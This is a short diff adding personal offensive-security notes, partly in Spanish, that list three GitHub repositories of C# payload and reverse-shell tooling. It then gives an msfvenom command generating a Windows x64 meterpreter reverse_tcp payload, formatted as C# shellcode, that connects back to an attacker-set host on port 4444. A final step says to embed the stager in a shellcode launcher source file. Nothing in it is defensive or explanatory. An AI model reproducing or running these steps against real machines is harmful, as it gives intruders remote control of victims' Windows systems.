@@ -1,0 +1,6 @@
+## https://github.com/Arno0x/CSharpScripts
+## https://github.com/Hackplayers/Salsa-tools
+## https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp
+
+- msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=[host] LPORT=4444 -f csharp
+- incrustar stager en shelcoderlauncher.cs
